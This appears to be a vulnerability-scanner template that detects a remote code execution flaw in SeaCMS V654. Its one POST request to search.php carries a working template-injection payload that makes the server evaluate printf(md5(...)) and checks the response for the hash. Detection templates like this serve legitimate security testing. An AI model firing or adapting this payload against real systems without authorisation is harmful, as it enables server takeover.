id: seacms-v654-rce

info:
  name: Seacms V654 Remote Code Execution
  author: ProjectDiscoveryAI
  severity: high
  tags: rce
  description: |
    Seacms V654 is vulnerable to a remote code execution vulnerability.

variables:
  rand: "{{rand_int(10000, 21000)}}"

http:
  - raw:
      - |
        POST /search.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=prin&9[]=tf(md5({{rand}}));
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{md5(rand)}}"
        part: body
